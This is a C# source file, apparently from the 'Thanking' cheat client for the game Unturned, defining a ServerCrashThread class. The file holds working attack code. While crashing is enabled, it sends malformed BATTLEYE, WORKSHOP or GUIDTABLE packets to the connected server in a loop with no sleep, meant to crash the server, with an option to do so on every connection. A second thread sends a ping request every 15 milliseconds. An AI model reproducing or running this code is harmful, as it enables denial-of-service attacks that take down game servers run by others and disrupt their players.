using System.Linq;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            while (true)
            {
                if (AlwaysCrash && OV_Provider.IsConnected)
                    ServerCrashEnabled = true;

                if (ServerCrashEnabled)
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, new[] {(byte) ESteamPacket.BATTLEYE},
                                1, 0);
                            break;
                        case 2:
                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, new[] {(byte) ESteamPacket.WORKSHOP},
                                1, 0);
                            break;
                        case 3:
                            Provider.send(Provider.server, ESteamPacket.GUIDTABLE, new[] {(byte) ESteamPacket.GUIDTABLE},
                                1, 0);
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }

        [Thread]
        public static void PingCheck()
        {
            while (true)
            {
                Thread.Sleep(15);
                
                if (!OV_Provider.IsConnected)
                    continue;
                
                Provider.send(Provider.server, ESteamPacket.PING_REQUEST, new byte[]
                {
                    13
                }, 1, 0);
            }
        }
    }
}
